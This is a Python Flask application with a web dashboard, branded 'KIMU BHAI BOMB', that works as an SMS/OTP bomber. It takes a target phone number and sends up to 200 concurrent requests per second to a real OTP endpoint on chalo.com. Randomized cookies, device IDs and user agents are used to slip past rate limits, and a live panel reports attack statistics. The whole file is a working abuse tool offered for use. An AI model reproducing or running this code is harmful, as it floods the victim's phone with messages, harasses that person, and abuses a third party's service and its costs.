
# Developed by ERROR

from flask import Flask, request, jsonify, Response, render_template_string
from flask_cors import CORS
import requests
import json
import time
import random
import string
import uuid
import asyncio
import aiohttp
from collections import defaultdict
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

# Store active sessions (in-memory, will reset on cold start)
active_sessions = {}

# HTML Dashboard (same as before but simplified)
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KIMU BHAI BOMB - OTP Blaster API</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { text-align: center; padding: 30px; border-bottom: 2px solid #00ff00; margin-bottom: 30px; }
        .header h1 { font-size: 3em; text-shadow: 0 0 10px #00ff00; }
        .developer { color: #ff6600; margin-top: 10px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
        .card { background: rgba(0, 0, 0, 0.8); border: 1px solid #00ff00; border-radius: 10px; padding: 20px; }
        .card h2 { color: #00ff00; margin-bottom: 20px; border-left: 3px solid #00ff00; padding-left: 10px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #00ff00; }
        input, select {
            width: 100%; padding: 10px; background: #0a0a0a; border: 1px solid #00ff00;
            color: #00ff00; border-radius: 5px; font-family: monospace;
        }
        button {
            width: 100%; padding: 12px; background: #00ff00; color: #0a0a0a;
            border: none; border-radius: 5px; font-weight: bold; cursor: pointer;
            font-size: 16px; transition: all 0.3s;
        }
        button:hover { background: #00cc00; transform: scale(1.02); }
        button.stop { background: #ff0000; color: white; }
        .stats { background: rgba(0, 0, 0, 0.9); border: 1px solid #00ff00; border-radius: 10px; padding: 20px; margin-top: 20px; }
        .stat-item { display: inline-block; margin: 10px; padding: 10px; background: rgba(0, 255, 0, 0.1); border-radius: 5px; min-width: 150px; }
        .stat-label { font-size: 12px; color: #888; }
        .stat-value { font-size: 24px; font-weight: bold; color: #00ff00; }
        .log-container { background: #0a0a0a; border: 1px solid #00ff00; border-radius: 10px; padding: 20px; height: 400px; overflow-y: auto; }
        .log-entry { padding: 5px; border-bottom: 1px solid #1a1a1a; }
        .log-success { color: #00ff00; }
        .log-error { color: #ff4444; }
        .api-docs { margin-top: 30px; }
        .endpoint { background: #0a0a0a; padding: 15px; margin: 10px 0; border-left: 3px solid #00ff00; }
        .method { color: #ffaa00; font-weight: bold; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .status-active { color: #00ff00; animation: pulse 1s infinite; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 KIMU BHAI BOMB 🔥</h1>
            <div class="developer">Developed by ERROR | Deployed on Vercel</div>
        </div>
        
        <div class="grid">
            <div class="card">
                <h2>🎯 Attack Configuration</h2>
                <form id="bombForm">
                    <div class="input-group">
                        <label>📱 Phone Number</label>
                        <input type="tel" id="phone" placeholder="9876543210" required>
                    </div>
                    <div class="input-group">
                        <label>🌍 Country Code</label>
                        <input type="text" id="countryCode" value="91">
                    </div>
                    <div class="input-group">
                        <label>⏱️ Duration (seconds)</label>
                        <input type="number" id="duration" value="30" min="5" max="300">
                    </div>
                    <div class="input-group">
                        <label>⚡ Requests per second</label>
                        <input type="number" id="speed" value="50" min="10" max="200">
                    </div>
                    <button type="submit">💥 START BOMBING 💥</button>
                </form>
                <button id="stopBtn" class="stop" style="margin-top: 10px;">🛑 STOP ATTACK 🛑</button>
            </div>
            
            <div class="card">
                <h2>📊 Live Statistics</h2>
                <div id="stats">
                    <div class="stat-item"><div class="stat-label">Status</div><div class="stat-value" id="status">Idle</div></div>
                    <div class="stat-item"><div class="stat-label">Total Requests</div><div class="stat-value" id="total">0</div></div>
                    <div class="stat-item"><div class="stat-label">Successful</div><div class="stat-value" id="success">0</div></div>
                    <div class="stat-item"><div class="stat-label">Failed</div><div class="stat-value" id="failed">0</div></div>
                    <div class="stat-item"><div class="stat-label">Speed</div><div class="stat-value" id="speedStat">0</div></div>
                    <div class="stat-item"><div class="stat-label">Success Rate</div><div class="stat-value" id="successRate">0%</div></div>
                </div>
            </div>
        </div>
        
        <div class="stats">
            <h2>📝 Live Logs</h2>
            <div class="log-container" id="logs">
                <div class="log-entry">[INFO] Ready to attack!</div>
            </div>
        </div>
        
        <div class="api-docs">
            <h2>📚 API Endpoints</h2>
            <div class="endpoint"><span class="method">POST</span> /api/start - Start attack</div>
            <div class="endpoint"><span class="method">POST</span> /api/stop - Stop attack</div>
            <div class="endpoint"><span class="method">GET</span> /api/status/{sessionId} - Get status</div>
        </div>
    </div>
    
    <script>
        let currentSessionId = null;
        let intervalId = null;
        
        document.getElementById('bombForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const countryCode = document.getElementById('countryCode').value;
            const duration = parseInt(document.getElementById('duration').value);
            const speed = parseInt(document.getElementById('speed').value);
            
            const response = await fetch('/api/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone, countryCode, duration, speed})
            });
            const data = await response.json();
            
            if (data.success) {
                currentSessionId = data.sessionId;
                addLog(`Attack started! Session: ${currentSessionId}`, 'success');
                startPolling();
            } else {
                addLog(`Error: ${data.message}`, 'error');
            }
        });
        
        document.getElementById('stopBtn').addEventListener('click', async () => {
            if (!currentSessionId) return;
            await fetch('/api/stop', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({sessionId: currentSessionId})});
            addLog('Attack stopped!', 'success');
            if (intervalId) clearInterval(intervalId);
        });
        
        function startPolling() {
            if (intervalId) clearInterval(intervalId);
            intervalId = setInterval(async () => {
                if (!currentSessionId) return;
                const response = await fetch(`/api/status/${currentSessionId}`);
                const data = await response.json();
                if (data.success) {
                    updateStats(data.stats);
                }
            }, 1000);
        }
        
        function updateStats(stats) {
            document.getElementById('total').innerHTML = stats.total;
            document.getElementById('success').innerHTML = stats.success;
            document.getElementById('failed').innerHTML = stats.failed;
            document.getElementById('speedStat').innerHTML = stats.speed;
            document.getElementById('successRate').innerHTML = stats.successRate + '%';
            document.getElementById('status').innerHTML = stats.isRunning ? 'Bombing...' : 'Stopped';
        }
        
        function addLog(message, type) {
            const logContainer = document.getElementById('logs');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;
        }
    </script>
</body>
</html>
'''

class AsyncOTPBomber:
    def __init__(self, session_id, phone_number, country_code, duration, speed):
        self.session_id = session_id
        self.phone_number = phone_number
        self.country_code = country_code
        self.duration = duration
        self.speed = speed
        self.is_running = False
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'status_codes': defaultdict(int),
            'start_time': None,
            'speed': 0
        }
        
    def random_string(self, length=32):
        return ''.join(random.choices(string.hexdigits.lower(), k=length))
    
    def random_number(self, length=10):
        return ''.join(random.choices(string.digits, k=length))
    
    def random_timestamp(self):
        return str(int(time.time() * 1000)) + str(random.randint(100, 999))
    
    def generate_random_cookies(self):
        distinct_id = self.random_string(32)
        device_id = self.random_string(36)
        ga_id = f"GA1.1.{self.random_number(8)}.{self.random_timestamp()}"
        
        mixpanel_data = {
            "distinct_id": distinct_id,
            "$device_id": device_id,
            "$user_id": distinct_id,
            "clientSource": random.choice(["PWA", "APP", "WEB"]),
            "deviceId": distinct_id
        }
        
        cookies = {
            '_ga': ga_id,
            f'mp_{self.random_string(32)}_mixpanel': json.dumps(mixpanel_data),
            'session_id': self.random_string(24)
        }
        return '; '.join([f'{k}={v}' for k, v in cookies.items()])
    
    def generate_headers(self):
        user_agents = [
            "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 Chrome/148.0.7778.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/147.0.7778.100 Mobile Safari/537.36",
        ]
        user_agent = random.choice(user_agents)
        
        return {
            'User-Agent': user_agent,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'source': str(random.randint(1, 10)),
            'userid': f'+{self.country_code}-{self.phone_number}',
            'origin': 'https://chalo.com',
            'Cookie': self.generate_random_cookies()
        }
    
    async def send_request_async(self):
        url = "https://chalo.com/app/api/chaukidar/v1/otp"
        payload = {
            "phoneNumber": self.phone_number,
            "countryCode": self.country_code,
            "templateId": "1f9mk"
        }
        headers = self.generate_headers()
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as response:
                    status = response.status
                    success = status == 200
                    
                    self.stats['total'] += 1
                    if success:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    self.stats['status_codes'][status] += 1
                    
                    return success, status
        except Exception as e:
            self.stats['total'] += 1
            self.stats['failed'] += 1
            return False, str(e)
    
    async def run(self):
        self.is_running = True
        self.stats['start_time'] = time.time()
        start_time = time.time()
        last_total = 0
        
        while self.is_running and (time.time() - start_time) < self.duration:
            # Send multiple requests concurrently based on speed
            batch_size = min(self.speed, 50)  # Limit batch size
            tasks = []
            for _ in range(batch_size):
                if not self.is_running:
                    break
                tasks.append(self.send_request_async())
            
            if tasks:
                await asyncio.gather(*tasks)
            
            # Update speed
            elapsed = time.time() - start_time
            current_total = self.stats['total']
            self.stats['speed'] = current_total - last_total
            last_total = current_total
            
            # Small delay to prevent overwhelming
            await asyncio.sleep(0.01)
        
        self.is_running = False
        return self.stats
    
    def get_stats(self):
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        success_rate = (self.stats['success'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
        return {
            'total': self.stats['total'],
            'success': self.stats['success'],
            'failed': self.stats['failed'],
            'successRate': round(success_rate, 1),
            'speed': self.stats['speed'],
            'elapsed': round(elapsed, 1),
            'isRunning': self.is_running,
            'statusCodes': dict(self.stats['status_codes'])
        }

# API Routes
@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/start', methods=['POST'])
def start_attack():
    try:
        data = request.json
        phone = data.get('phone')
        country_code = data.get('countryCode', '91')
        duration = min(int(data.get('duration', 30)), 300)  # Max 5 minutes on Vercel
        speed = min(int(data.get('speed', 50)), 200)  # Limit speed on Vercel
        
        if not phone or not phone.isdigit():
            return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
        
        session_id = str(uuid.uuid4())
        bomber = AsyncOTPBomber(session_id, phone, country_code, duration, speed)
        active_sessions[session_id] = bomber
        
        # Run async attack
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.create_task(bomber.run())
        
        return jsonify({'success': True, 'sessionId': session_id, 'message': f'Attack started for {phone}'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    try:
        data = request.json
        session_id = data.get('sessionId')
        
        if session_id in active_sessions:
            active_sessions[session_id].is_running = False
            del active_sessions[session_id]
            return jsonify({'success': True, 'message': 'Attack stopped'})
        return jsonify({'success': False, 'message': 'Session not found'}), 404
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/api/status/<session_id>')
def get_status(session_id):
    if session_id in active_sessions:
        stats = active_sessions[session_id].get_stats()
        return jsonify({'success': True, 'stats': stats})
    return jsonify({'success': False, 'message': 'Session not found'}), 404

@app.route('/api/health')
def health_check():
    return jsonify({'status': 'healthy', 'active_sessions': len(active_sessions), 'platform': 'Vercel'})

# For local development
if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)